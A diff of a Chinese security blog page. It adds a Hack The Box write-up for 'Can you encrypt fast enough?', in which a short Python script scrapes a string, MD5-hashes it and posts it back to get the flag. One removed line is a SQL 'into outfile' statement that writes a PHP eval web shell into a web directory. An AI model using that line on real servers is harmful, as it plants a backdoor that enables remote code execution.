@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="qt">
   <meta name="keywords" content="">
-  <title>qt安全博客</title>
+  <title>HTB Can you encrypt fast enough? - qt安全博客</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
 
@@ -174,9 +174,9 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="">
+            <span class="h2" id="subtitle" title="HTB Can you encrypt fast enough?">
               
-                
+                HTB Can you encrypt fast enough?
               
             </span>
 
@@ -198,7 +198,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      8 字
+      125 字
     </span>
   
 
@@ -208,7 +208,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1
+      2
        分钟
     </span>
   
@@ -238,15 +238,41 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none"></h1>
+            <h1 style="display: none">HTB Can you encrypt fast enough?</h1>
             
             <div class="markdown-body">
-              <p>select ‘<?php eval($_POST[123]) ?>‘ into outfile ‘D:/phpstudy_pro/WWW/123.php’;</p>
+              <p>打开界面后如下图：<br><img src="/2021/03/05/HTB-Can-you-encrypt-fast-enough/01.png" srcset="/img/loading.gif"><br>尝试MD5加密后填进输入框后提示 “Too slow!”<br><img src="/2021/03/05/HTB-Can-you-encrypt-fast-enough/02.png" srcset="/img/loading.gif"><br>查看源码后推测，应该是用程序发包，构造如下Python代码：</p>
+<pre><code class="hljs stylus">import requests
+import hashlib
+import re
+
+url=<span class="hljs-string">&quot;http://139.59.176.149:30207/&quot;</span>
+
+r=requests<span class="hljs-selector-class">.session</span>()
+out=r<span class="hljs-selector-class">.get</span>(url)
+
+rr = re<span class="hljs-selector-class">.compile</span>(r<span class="hljs-string">&quot;&lt;h3 align=&#x27;center&#x27;&gt;(\S+)&lt;/h3&gt;&quot;</span>, re.I)
+str1 = rr<span class="hljs-selector-class">.findall</span>(out.text)
+str2=hashlib<span class="hljs-selector-class">.md5</span>(str1<span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<span class="hljs-selector-class">.hexdigest</span>()
+
+data=&#123;<span class="hljs-string">&#x27;hash&#x27;</span>: str2&#125;
+out = r<span class="hljs-selector-class">.post</span>(url = url, data = data)
+
+<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(out.text)</span></span></code></pre>
+
+<p>成功回复flag<br><img src="/2021/03/05/HTB-Can-you-encrypt-fast-enough/03.png" srcset="/img/loading.gif"></p>
 
             </div>
             <hr>
             <div>
               <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/web/">web</a>
+                    
+                  </div>
                 
                 
               </div>
